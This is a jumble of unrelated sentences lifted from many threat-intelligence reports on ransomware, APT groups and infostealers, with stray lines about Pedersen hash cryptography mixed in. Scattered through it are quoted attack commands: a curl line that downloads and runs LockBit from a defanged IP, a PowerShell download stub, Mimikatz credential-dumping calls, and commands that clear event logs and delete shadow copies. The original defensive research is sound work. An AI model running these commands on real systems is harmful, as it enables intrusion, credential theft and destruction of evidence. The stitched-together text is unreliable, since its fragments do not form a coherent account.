Using such a signed representation introduces a few subtleties that should be kept in check in order to ensure the collision-resistance of the hash function.
Vice Society leak site including additional blog content (early November).The new “Our Partners” page takes the place of the main page from the previous incarnation of the leak site, including links to view leaked victim data. 
The payload will be decrypted with RC4 algorithm, and the final payload is an HTTPs Cobalt Strike beacon. 
Financially Motivated Campaign Leverages CMD-Based Scripts and LOLBaS for Online Banking Theft in Portugal, Peru, and Mexico An unknown financially motivated threat actor, very likely from Brazil, is targeting Spanish- and Portuguese-speaking victims, with the goal of stealing online banking access.
Hex-Rays decompiled code of the ModScan ping functionality When the ModScan module starts the scan, some of the following information may be gathered, depending on the parameters received along with the scan command: Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure 5) to the specified IP address on port 50123 used by the MDS HTTP Service.
The NoEscape ransomware excludes the below file extensions and folder names from encryption. 
Eriknetwalker began advertising their ransomware in 2016 (Google-translated from Russian) 
T1204.002
The exploit payload created a Scheduled Task
Audit domain controllers to log successful Kerberos Ticket Granting Service (TGS) requests and ensure the events are monitored for anomalous activity. 
In the case of Domino Backdoor a hash is generated from the system username and hostname and the process ID is appended.
Let’s look at API calls and debuggers. 
If you think a cyber incident may have impacted you, the Unit 42 Incident Response team is available 24/7/365.
Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.
[D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 04 00000000`0014ff30 00007ffb`ecba2651 KERNEL32!BaseThreadInitThunk+0x14 05
Figure 25.
This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure. 
From September to December this year, we have detected multiple attacks from Royal ransomware, with the US and Brazil being the most targeted countries (Figure 1).
Patch for publicly available Cobalt Strike vulnerability tracked as CVE-2022-39197 [17].Figure 8 shows a small portion of Cobalt Strike Cat logs from the attacker´s infrastructure.
Indicators Indicator Type Description 7391bbd59330e79f8ee4a01e5ed20df5ab183737f2b91f926b649facd8d2d278 462e39e554bd3abb9ecdcec92d861b315f1efb77 2831b37cf521848142e8a5d69515b065Sha256 Sha1 Md5Malicious docx filed833c23bad7b1988832524bce8a6355c97d031bb3852f671e52fdf9024bd6ec0 32a155dbb9652dd88ae41044e342c1ef92f7e6f2 5e7b650a6e0070bceed648681bff20feSha256 Sha1 Md5Malicious docx file78db865edcf1bcd27b765c458ef1675233b11947dfceef7c45fdd254ae514a3f 2a6df9fa510af4d3e7fde1002ad54c5576abbc07 9a1cac28f716d2e660f2bd6297cd560bSha256 Sha1 Md5 Malicious .dotm file8022060ef633e157518037122a6003813cc0a3066d456a1164275a211efc8f5c 32a155dbb9652dd88ae41044e342c1ef92f7e6f2 5e7b650a6e0070bceed648681bff20fe Sha256 Sha1 Md5 Lockbit ransomwarehxxp://91[.]107[.]210[.]207/tinytask[.]exe hxxp://91[.]107[.]210[.]207/b66ssc[.]dotmURLS 
Agent Tesla packers We have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples.
This is likely to ensure that customers were able to use the 3CX desktop package without noticing anything unusual about the affected package.
GlobalSign CodeSigning CA - SHA256 - G2 Valid From: 07:43 AM 08/20/2015 
Ensure storage of clear text passwords in LSASS memory is disabled.
Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [DS0017]. Detection:
G0114 Chimera
The malware Hancitor Hancitor (aka Chanitor) is a downloader which is used to gain initial access to a victim’s computer.
The link file exploits this issue and feeds the legitimate script with the following command line argument to download and execute a remote “note.hta”: ;\W_\*2\\\m_h_a_e ('http'+'://datacenter002[.]myftp[.]biz/documents/note.
2019Password sprayIPv4 address59.47.4[.]27Q2 2019ADFS loginIPv4 address45.9.248[.]74Q2 2019Citrix loginIPv4 address172.111.210[.]53Q2 2019Citrix loginIPv4 address103.51.145[.]123 2019Initial access IPv4 address119.39.248[.]32 2019Initial accessIPv4 address120.227.35[.]98 2019Initial accessIPv4 address14.229.140[.]66 2019Mount the file-share IPv4 address172.111.210[.]53 2019Initial accessIPv4 address188.72.99[.]41 2019Initial accessIPv4 address45.9.248[.]74 2019Initial accessIPv4
Chinese state-sponsored cyber actors’ Defensive Evasion TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Deobfuscate/Decode Files or Information [T1140] Chinese state-sponsored cyber actors were observed using the 7-Zip utility to unzip imported tools and malware files onto the victim device. 
POSHSPY makes the most of using built-in Windows features – so-called “living off the land” – to make an especially stealthy backdoor.
1AAE62ACEE3C04A6728F9EDC3756FABD6E342252host2ip.execleanResolves a hostname to an IP address. 
Reducing Forensic Evidence on Disk UNC215 consistently cleaned up evidence of their intrusion after gaining access to a system.
The second stage payload, which was later determined to likely be the penetration testing framework "Brute Ratel," was then downloaded via a connection to an IP from Russia. 
Talos created the following coverage for this:Snort SIDs:Snort 3: 300480,300481Snort 2: 61550-61553Orbital QueriesCisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat.
In campaign 1, the malware author used phishing emails to deliver malicious OneNote document either as attachment or a URL link to zip file containing the OneNote document.
Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure)
However, even though the security of the Pedersen hash function is well-understood (since it relies on the assumed hardness of the discrete logarithm problem), a few easily-overlooked subtleties in its definition have the potential to invalidate its security guarantees and thus completely break the security of the systems based on it.\n
This paper inspired many researchers to expand the possibilities of this unique way of hiding the final destination server on web traffic.
We also share information to the community and industry partners on ways to detect these attacks, including detection details of MERCURY and DEV-1084’s tools in Microsoft 365 Defender, Microsoft Defender for Identity, Microsoft Defender for Cloud Applications, Microsoft Defender Antivirus, and Microsoft Defender for Endpoint.
S0596 ShadowPad
The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.
Increase the Time to Live (TTL) on current DNS records to ensure that they’ll remain for an extended time in external DNS caches.
This is a simple backdoor that is capable of executing commands and clearing event logs. 
Unpacked file names referencing tax documents in the malware In some cases, GuLoader was used to execute shellcode and subsequently download Remcos on the target system.
TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa.
Group Policy Modification
The other header data is used for decryption: a 32-byte key is located at offset 0x28 and a 12-byte nonce for the ChaCha20 algorithm is at offset 0x50. 
You may choose one of these termination statement methods. 
Apple has also added (TCC) protections to user files founds in (now) protected directories such as ~/Desktop, ~/Documents, etc. etc.
GuLoader leverages user-initiated scripts or shortcut files to execute multiple rounds of highly obfuscated commands and encrypted shellcode.
UYODolphin backdoor version 3.0 (x86) 2C6CC71B7E7E4B28C2C176B504BC5BDB687C4D41N/AWin64/Agent.
As seen in the screenshot below, the .rdata section has an entropy level higher than 7, and it’s very unusual for this section to have randomized data.
CatB Ransomware Process Graph First, the dropper is distributed in the form of a UPX-packed DLL (versions.dll).
This is a simple PowerShell script that downloads a file from a fixed location and executes it. 
CSC 4 Control Admin Privileges CSC 5 Secure Configuration CSC 6 Log Analysis Endpoint Security Platform 10.7, Threat Prevention, MVISION EDR Command and Control Ingress Tool Transfer (T1105) 
During this hour, we tasked the Beacon with carrying out several commands.
GetBytes method to create a cryptographically strong sequence of random values in a 4096-byte array.
Impair Defenses: Disable or Modify Tools T1562.001 TrickBot can disable Windows Defender. 
WebClient $url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate' $file =
Example 1—Loading REvil ransomware 
A ZIP or self extracting archive (SFX) containing legitimate HTML webpages used as a decoy [A-Z]License (hidden).
Subsequent analysis showed that this same code is present in hundreds of models of Gigabyte PCs.
Some of these only received one payment but there are several that received multiple payments. 
These included: Cobalt Strike and Merlin payloads for C2 throughout the assessment.
We believe the group has also operated prior to this date, though perhaps not under the “LAPSUS$” banner. 
S0597 GoldFinder
Tactic Technique Observable Credential Access T1003.006 OS Credential Dumping: DCSync The threat actor obtained Active Directory credentials through domain replication protocols using the Get-ADReplAccount command from DSInternals Credential Access T1003.001: OS Credential Dumping: LSASS Memory The threat actor used a heavily obfuscated PowerShell script to execute the Mimikatz commands ‘privilege::debug sekurlsa::logonpasswords “lsadump::lsa /patch”‘ in-memory and encrypt the output Initial Access / Persistence T1078.003: Valid Accounts: Local Accounts A local account was used by the Threat Actor to establish a SSH tunnel into the internal network environment Initial Access / Persistence T1133:
PROPAGATION Unknown to everyone but the attacker, multiple files were being transmitted throughout the environment: Two file names were observed during the incident "Client_s.exe" and "Client.exe."
Reflection is used to run the static method Funny.
Linux Infection The Linux version of FinSpy is protected with an obfuscator similar to OLLVM.
[T1531] Windows Event Logs End User Reporting Detect and Identify source IP and source process of exfiltration Analyze host used for exfiltration once detected Develop response plan None Local Admin User Account Creation (workstation) Create a local administrator account on a target workstation system. 
In the IronPython script, the embedded .NET injector (SHA256: a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc) and ComRAT DLL payload (SHA256: a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56) get decoded and decrypted.
= ⟨M1⟩ ⋅
Microsoft researchers have also found new evidence that Zerobot propagates by compromising devices with known vulnerabilities that are not included in the malware binary, such as CVE-2022-30023, a command injection vulnerability in Tenda GPON AC1200 routers. 
Credential dumping tools like Mimikatz do this by enumerating all the user logon sessions and replacing the user credentials with the stolen usernames and NTLM hashes provided, in the current logon session.
In the first image, the attackers open a socks listening port, in this case port 8888, on the Cobalt Strike team server. 
How does MuddyWater Attack? 
A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith. 
In addition to issues that are exclusively related to padding, the ability to hash larger messages may break injectivity of the function.
Big shout-out to @Kostastsale for helping put this Part 2 together!
Figure 6: Collecting the cbData “manifest” is a file that the malware writes to the system under the “3cxdesktopapp” folder during the initial stage of the infection.
csrss.exe -h breached.contoso.com -f
/accepteula – Suppress display of the license dialog. 
Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from server associated with .
As illustrated in the overview, the September 2019 NetWalker version has a different codebase from the ErikNetWalker-linked ransomware variants.
Enforce response rate limiting (RRL) settings on all DNS servers. 
The email address linked to the Authenticode certificate also links to that domain name.
Upon execution, the malware creates the mutex to mark its presence on the system and retrieves the MachineGuid of the infected system from the "SOFTWARE\Microsoft\Cryptography\MachineGuid" registry key. 
Visit the MITRE ATT&CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies. 
Disabling this security control allows attackers to leverage pass-the-hash attacks and hinder RDP's security on systems.cmd.exe /q /c
These align with their usage by the XMRig downloader and miner.
The beacon modifies the victim's system power and lid open/close policies in the registry. 
WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell.
Then it creates two Windows shortcut files in the Windows startup folder using the Internet Explorer application icon and the target paths pointing to the two dropped batch scripts.
These signatures were found in the logs on various hosts. 
Having said that, legitimate organizations can use protectors to protect their software from being cracked and manipulated. 
SharpPanda APT Campaign Expands its Arsenal Targeting G20 Nations
Macro implementation Macro-inserted document text 
GoBruteforcer Makes Advances During our hunt for the samples related to GoBruteforcer campaign, we found another sample (SHA256 acc705210814ff5156957c028a8d6544deaca0555156504087fdc61f015d6834).
The password required to achieve the MD5 hash is boris. 
Option to use Google 2FA key during login to the command-and-control server as an attacker for further operational security. 
Logical file removal is the most common way of erasing a file, performed by users daily when a file is sent to (and emptied from) the Recycle bin, or when it is removed with the command line or terminal with the commands del/rm.
Brute Force: Password Cracking T1110.002 
Function sets the virtual memory page permission to Read-Write-Execute. 
T1562.009.
End users and enterprises alike can mitigate the risk of infection from new threats like the TargetCompany ransomware by following these security best practices: Enable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network. 
In part of our analysis, we used a ransomware sample with the detection name Ransom.Win64.YORAL.SMYXCJCT.
Its C2 server is interesting: update.facebookdocs[.]com. 
Also in this case, functions has been resolved by their hashes. 
[T1071] Intrusion Detection or Prevention Systems Endpoint Protection Platform Windows Event Logs Detect and Identify source IP and source process of enumeration Analyze scanning host once detected Develop response plan None Active Directory Account Lockout Lock out several administrative AD accounts Account Access Removal
The targeting of LATAM government entities could represent an initial shift away from internal cybercriminal policies on the targeting of governments worldwide.
As we’ve previously detailed in this blog post series, this has resulted in a seemingly limitless number of evasions and strategies targeted at confounding sandboxing and static analysis approaches.
More importantly: the trial version doesn’t support encryption of command and control traffic in cases where the protocol itself isn’t encrypted, such as DNS.
AS date_time, ingestion_timestamp pid, name, cmdline, path, parent, gid, uid, euid, egid, sha1, sha256 FROM xdr_data WHERE query_name = 'running_processes_osx_events' AND LOWER(cmdline) LIKE '%sh -c%' AND LOWER(cmdline) LIKE '%/3cx desktop app/updateagent%' 5.
File Name: pxh4HG1v.ashx Hash (SHA256): c838e77afe750d713e67ffeb4ec1b82ee9066cbe21f11181fd34429f70831ec1 Path: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\pxh4HG1v.ashx File Name: RedirSuiteServiceProxy.aspx Hash (SHA256): 65a002fe655dc1751add167cf00adf284c080ab2e97cd386881518d3a31d27f5 Path: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServiceProxy.aspx File Name: RedirSuiteServiceProxy.aspx Hash (SHA256): b5038f1912e7253c7747d2f0fa5310ee8319288f818392298fd92009926268ca Path: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServiceProxy.aspx File Name: Xml.ashx Hash (SHA256): c838e77afe750d713e67ffeb4ec1b82ee9066cbe21f11181fd34429f70831ec1 Path: Xml.ashx Filename: errorEE.aspx SHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257 Path: 
But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data. 
Figure 13.
Introduction CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to Federal and non-Federal entities with respect to cybersecurity risks.
The scripts also rely heavily on the usage of mktemp to generate variables within the scripts.
LSASS Memory Resource Development T1588.003: Code Signing Certificates T1588.004: Digital Certificates T1608.003: Install Digital Certificate Acknowledgements Thanks to everyone that contributed analysis and review.
Figure 7 shows the deobfuscated SMOKEDHAM dropper. 
The offset at which the jump occurs is written immediately after a call instruction (see the following figure). 
The example below shows the variant in which a PE file was encoded as an obfuscated hexadecimal string.
The Fortinet AntiVirus engine is a part of each of those solutions.
The Initial Loader The Initial Loader is the following shell script:
In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts.
First, the initial loader/injector winutils.dll is protected with UPX-style packing.
Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023.
This report comes on the heels of the July 19, 2021, announcements by governments in North America, Europe, and Asia and intragovernmental organizations, such as the North Atlantic Treaty Organization (NATO), and the European Union, condemning widespread cyber espionage conducted on behalf of the Chinese Government.
Figure 15 – DCSync Attack As indicated earlier, with the NTLM hash of the KRBTGT account, adversaries can initiate a Golden Ticket attack (Pass-the-Ticket) by injecting the forged Kerberos tickets into the current session which can be used to authenticate to any service with the client that supports pass the ticket (for instance, sqlcmd.exe connection to DB server, PsExec, etc.) 
In later versions, the timestamps corresponded to the times when the samples were discovered.
Case Summary In this intrusion, the threat actors operated in an environment over an 11 day dwell period.
Figure 14 – Installation of malicious Windows service. 
Control codes to manipulate a process name in various internal structures are also exposed by the driver. 
The decision for which of the versions should be applied is made based on the check if the process runs as Wow64 (emulated 32 bit on 64 bit Windows): If the process runs on a 32-bit system, the syscall can be made in a direct way, using SYSENTER: 
Modify Registry T1112 Hive actors set registry values for DisableAntiSpyware and DisableAntiVirus to 1. Impair Defenses T1562 Hive actors seek processes related to backups, antivirus/anti-spyware, and file copying and terminates those processes to facilitate file encryption. 
Figure 4.
The Dump.bin has a modified PE header.
With this in mind, vendors are taking more precautions to mitigate attacks like MoonBounce, for example by enabling Secure Boot by default.
A good approach to prevent theft of data is to adopt least privilege access, which means ensuring only the required people have access, followed by granular controls on exporting, sharing, or moving the files.
S0504 Anchor
Try Secure Endpoint for free here.
IRC registering itself in cron.
Examples of the command-line syntax used in these cases are below.cmd.exe /q /c
The target thread then retrieves the payload from the global atom table and inserts it into a read/write (RW) region inside the target process memory space (a code cave inside the kernelbase.dll data section).
In order to accomplish this, Kimsuky distributes an email that lure targeted individuals to log in to a spoofed NK News subscription service.
Their first PoS malware was spotted in the wild in October 2016.
Over the last 5 months, LAPSUS$ has gained large notoriety with some successful breaches of some large enterprises including, Microsoft, Nvidia, Okta & Samsung.
How-To-Extension.pdf c:\users\public\Inproc.exe* start xcopy
However, it focuses on redundancy to gain a foothold on the infected machine, including setting up multiple persistency tasks, communication with several different C&C servers, and different types of C&C command execution. 
Strings for pipe names are dynamically generated and incorporate random numbers, meaning they can change every time the malware is executed.
The ransomware note was also used to recruit insiders from victim organizations.
dir %HOMEDRIVE%%HOMEPATH%cmd.exe /C
In this blog, we discuss this latest development in the TargetCompany ransomware’s behavior and look into its previous infection chains. 
Fantasy wiper execution flow Initially, Fantasy creates a mutex to ensure that only one instance is running.
The team leveraged access available from SCCM 2 to move around the organization’s network for post-exploitation activities (See Post-Exploitation Activity section). 
This is not the only example of a connection between the Crosswalk and ShadowPad network infrastructures.
New attack capabilities 
Initial Access 
In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.
And though “RansomWhere?” is a bit dated, it appears to be able to generically detect this LockBit sample …even though it had no a priori knowledge of this malware: RansomWhere?
Below is the relevant data for the files analyzed. 
As incident response teams in the region build up their security posture, threat actors are likely to continue to enhance and create infostealer variants to target organizations in LATAM with the intent of harvesting personal and corporate account login details and other important data. 
Alternate ransom note (fisha001) 
The tool provides various remote access and surveillance features including keylogging, screenshots and audio recording among other features which make the tool an attractive choice for threat actors.
In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory.
T1566.002Phishing:
Remote Access Software;To remotely access the compromised infrastructure, the attackers may use the legitimate tools TeamViewer and ScreenConnect. 
By doing this, each infected device and the remote attacker’s server have created a covert channel that can be used to exfiltrate data from the victim device or deliver more malware, such as ransomware, to the target device. 
Figure 37: Contents of the user.ps1 Another new addition to BatLoader is the antivirus check script (checkav.ps1).
We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT. Figure 1.
And lastly, many of these organizations are charged with protecting some of the most sensitive and valuable personally identifiable information (PII) of any business sector. 
It checks the response status code and proceeds accordingly.
Let’s take a peek via macOS’s codesign and spctl utilities: 
It creates Windows shortcut files configured to run the payloads in the startup folder of the victim’s machine and restarts the machine after 10 seconds.
The diminished use of OneNote by Qakbot during the week of February 20th is corroborated by public mentions (1, 2, 3) of ISO images in lieu of the aforementioned file type. 
S0093 Backdoor.Oldrea
For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com. ESET Research offers private APT intelligence reports and data feeds.
cmd /U /C
The initial infection starts with the user searching for installers such as Zoom, TeamViewer, AnyDesk, or FileZilla.
At this point, installation of the backdoor is complete.
Figure 18.
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4.
Event Triggered Execution: Windows Management Instrumentation Event Subscription T1546.003 
Downloads the miner and watcher. 
Specifically, they use a windowed scalar multiplication with an encoding where 3-bit chunks are mapped to elements of the range {-4, …, 4} {0}, instead of the range {0, …, 7}.\n
It is used by numerous threat actors who perform cyberespionage or cybercrime. 
The decryption key is the EFI system partition GUID, which differs from one machine to another. 
S0606 Bad Rabbit
Depending on how the code is delivered, the code can be injected into other legitimate running processes, bypassing defenses that do not scan legitimate processes or code in-memory. 
After exfiltrating the email addresses, the script creates a folder “fb” in the Public user folder and creates an HTML file in it, named “adjuntos_1503.html” in our sample analysis.
“cmd /c powershell/W 01 curl hxxp://91[.]107[.]210[.]207/tinytask.exe -o C:\Users\Public\456trytgre3e45yrthtgr.exe; C:\Users\Public\456trytgre3e45yrthtgr.exe” The downloaded payload is Lockbit ransomware 2.0. 
While it seems to have taken inspiration from some of the most infamous ransomware families, it also contains unique functionalities, rarely seen among ransomware, such as the use of direct syscalls. 
Next the malware copies a chunk of encrypted data (size: 0x2468 bytes) from a variable named apple_config to a variable named g_Config. 
Text.
S0398 HyperBro
Stealing Credentials from Active Directory Domain Service (ntdis.dit) File As indicted earlier, once an attacker has penetrated the domain network, it will be natural to progress towards targeting critical assets, such as the Active Directory controller.
What is more interesting are the files in the main directory.
/c wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D
Additionally, Hive actors have used anonymous file sharing sites to disclose exfiltrated data (see table 1 below). 
Python
The FLAGS register is the status register that contains the current state of a x86 CPU.
In some cases, BlackCat operators use the chat to threaten the victim, claiming they will perform a DDoS attack on the victims' infrastructure if the ransom is not paid.
Click here to request a trial. 
The attackers used the unique TTP of initiating the loader execution through exe in all cases observed by us.
Since January 2022 we observed an increase in the activity of Cobalt Strike deployments following Emotet intrusions. 
Chrome Browser Extension Identification Chrome Extension ibnejdfjmmkpcnlpebklmnkoeoihofec Tronlink jbdaocneiiinmjbjlgalhcelgbejmnid NiftyWallet nkbihfbeogaeaoehlefnkodbefgpgknn Metamask afbcbjpbpfadlkmhmclhkeeodmamcflc MathWallet hnfanknocfeofbddgcijnmhnfnkdnaad Coinbase fhbohimaelbohpjbbldcngcnapndodjp BinanceChain odbfpeeihdkbihmopkbjmoonfanlbfcl BraveWallet hpglfhgfnhbgpjdenjgmdgoeiappafln GuardaWallet blnieiiffboillknjnepogjhkgnoapac EqualWallet cjelfplplebdjjenllpjcblmjkfcffne JaxxxLiberty fihkakfobkmkjojpchpfgcmhfjnmnfpi BitAppWallet kncchdigobghenbbaddojjnnaogfppfj iWallet amkmjjmmflddogmhpjloimipbofnfjih Wombat ffnbelfdoeiohenkjibnmadjiehjhajb YoroiWallet fhilaheimglignddkjgofkcbgekhenbh AtomicWallet nlbmnnijcnlegkjjpcfjclmcfggfefdm MewCx nanjmdknhkinifnkgdcggcfnhdaammmj GuildWallet nkddgncdjgjfcddamfgcmfnlhccnimig SaturnWallet fnjhmkhhmkbjkkabndcnnogagogbneec RoninWallet RedLine Stealer can also retrieve information related to the following: VPN (Nord, OpenVPN, ProtonVPN) profiles FileZilla credentials Discord, Telegram and Steam Token Information IOCs Hash (SHA256) 
Based on our observations, Earth Preta tends to hide malicious payloads in fake files, disguising them as legitimate ones — a technique that has been proven effective for avoiding detection.
Pid: 3784 Address: 0x220000 One observation is the mention of the SVCHOST process with a ProcessID value of 1176 that is mentioned twice but with different addresses.
Its value must contain correct first 16 characters used to decrypt BlackCat configuration data. 
During our investigation, we discovered one dropper executable on two compromised machines, stored in the following locations: C:\IQXDatabase\Live\1.exe C:\OasisLive\1.exe Each time the initial dropper is executed, a unique configuration is generated, using mostly random bytes.
The DFIR Report url: https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/ 
System Information RedLine will search for the existence of multiple products that include cryptocurrency software, messaging apps, VPNs, and web browsers (full list shown in Table 2 below). 
The task’s description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created: Figure 3.
A concept might be, as usual, the IT department sending an E-Mail. 
Chinese state-sponsored cyber actors’ Credential Access TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation for
It then relies on a number of shell scripts to configure and orchestrate its mining operations.
Who is Mint Sandstorm? Mint Sandstorm is Microsoft’s new name for PHOSPHORUS, an Iranian nation-state actor.
Potential IOC IP Addresses for Compromise or Exfil: 84.32.188[.]57 84.32.188[.]238 93.115.26[.]251 185.8.105[.]67 181.231.81[.]239 185.8.105[.]112 186.111.136[.]37 192.53.123[.]202 158.69.36[.]149 46.166.161[.]123 108.62.118[.]190 46.166.161[.]93 185.247.71[.]106 46.166.162[.]125 5.61.37[.]207 46.166.162[.]96 185.8.105[.]103 46.166.169[.]34 5.199.162[.]220 93.115.25[.]139 5.199.162[.]229 93.115.27[.]148 89.147.109[.]208 83.97.20[.]81 5.61.37[.]207 5.199.162[.]220 5.199.162[.]229; 46.166.161[.]93 46.166.161[.]123; 46.166.162[.]96 46.166.162[.]125 46.166.169[.]34 83.97.20[.]81 84.32.188[.]238 84.32.188[.]57 89.147.109[.]208 93.115.25[.]139; 93.115.26[.]251 93.115.27[.]148 108.62.118[.]190 158.69.36[.]149/span> 181.231.81[.]239 185.8.105[.]67 185.8.105[.]103 185.8.105[.]112 185.247.71[.]106 186.111.136[.]37 192.53.123[.]202 MITRE ATT&CK TECHNIQUES See table 4 for all referenced threat actor tactics and techniques listed in this advisory. 
Windowed scalar multiplication leverages the simple observation that the multiplication of a curve point by a large scalar can be decomposed.\n
For a downloadable copy of IOCs, see AA22-321A.stix (STIX, 43.6 kb). 
If the environment variable does not exist, the module tries to load the library using its name dbcapi.dll.
Collection Within weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using the Collection [TA0009] technique listed in table 10. Table 10: Collection technique observed by CISA MITRE ID Name Observation T1114 Email Collection CISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments. 
After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim’s network.
MITRE ATT&CK:registered: Techniques Tactic Technique ID Technique Name ExecutionT1059 T1204Command and Scripting Interpreter User ExecutionDiscoveryT1082 T1083System Information Discovery File and Directory DiscoveryDefense EvasionT1070Delete shadow drive dataImpactT1486 T1490 Data encrypted for impact Inhibit System RecoveryCommand and controlT1071Application Layer ProtocolIndicators of Compromise (IOCs) 
The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager.
S0356 KONNI
In the following section, we will look at these tools that could accelerate analysis for defenders. 
Past performance is not indicative of future results.
The team gained persistent access to the organization’s network, moved laterally across the organization’s multiple geographically separated sites, and eventually gained access to systems adjacent to the organization’s sensitive business systems (SBSs).
Once the attachment is automatically unzipped, a malicious application in the attachment is in the filesystem and triggers the registration of a custom URL scheme handler.
The hashing algorithm is custom and appears to be based on an encryption algorithm used previously in the Lizar Loader. 
Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell. 
To find more technical details, threats, insights, and recommendations in protecting your NAS device, download our research “Backing Your Backup: Defending NAS Devices Against Evolving Threats.” Authors Stephen Hilt Sr. Threat Researcher Fernando Merces Sr. Threat Researcher 
The malware identifies the computer’s public IP address by making a HTTP GET request to “hxxp://api.ipify[.]org”, a free public IP address API.
Another server with the same certificate, 23.106.123[.]59 is currently redirecting to the official infrastructure of the government of Taiwan, but likely was used for the additional attacks by the threat actor. 
These actors take effort to mask their activities by using a revolving series of virtual private servers (VPSs) and common open-source or commercial penetration tools. Exploitation of Public Vulnerabilities.
While the total number of victim organizations (Figure 3) are still relatively small in comparison to Lockbit or BlackCat/APLHV, that is how all new ransomware families begin. 
Archive Collected Data: Archive via Utility Uses 7-Zip to compress stolen data for exfiltration. 
Local Email Collection
Monitor for suspicious sequences of Windows API calls such as CreateRemoteThread, VirtualAllocEx, or WriteProcessMemory and analyze processes for unexpected or atypical behavior such as opening network connections or reading files. 
Non-Standard Port [T1571] Chinese state-sponsored cyber actors have been observed using a non-standard SSH port to establish covert communication channels with VPS infrastructure. 
cbData is collected from the “manifest” file as shown below. 
In this blog, we will explain how attackers used an innocent-looking email to lure victims into opening an attachment.
We suspect this type of malware was used in the aforementioned operation.
Figure 4. NtProtectVirtualMemory prototype.
Persistent loader This component is responsible for both unpacking the main module and for its injection into one of the following processes: lsass.exe wininit.exe services.exe To unpack the main module, the persistent loader uses different approaches for the 32-bit and 64-bit versions.
[LSASS Memory Access] (T1003.001) WINDOWS METHODOLOGY
As pointed out by Brian Krebs, a small financial institution in New England battled some $120,000 in fraudulent charges from Brazilian stores within less than two days.
When EXCEPTION_ACCESS_VIOLATION and SINGLE_STEP_EXCEPTION exceptions are raised, handler perform following steps: It checks whether memory address being currently accessed is zero or not.
MachineName + ".local.domain".
The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords. 
This led to another round of discovery using net followed by AdFind. 
We assume that based on the received data the C2 server responds with either a simple string which can be decrypted to an active malware download server or with garbage data in the form of a simple string.
Ongoing analysis of emerging activity may provide additional insights.
John Althouse has created a medium post that accurately conveys the differences between JA3/S and JARM: “JARM actively scans the server and builds a fingerprint of the server application.
The malware deletes system event logs and shadow copies by performing the following commands: dism /online /enable-feature /featurename:NetFx3 vssadmin.exe Delete Shadows /All
Figure 15 displays the reverse SOCKS proxy activity on the infected device using the open-source tool FRP. 
Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored.
Timestomp [T1070.006] Modify Registry
/h
These samples contain slightly fewer credentials and a simpler self-propagation code that only supports downloading the payload via wget or the binary downloader embedded directly into the sample.
The installer generates two file paths for loading-chain components, <loader_step_1> and <loader_encrypted_step_2>, with the format <base_dir>\<inf_name>\<dll_name>. 
Figure 13 - RedLine .NET
Once the rest of the physical drives and the logical partitions sharing physical drive with the Operative System’s volume have been wiped, this last volume is wiped by: Erasing the MBR. 
S0570 BitPaymer
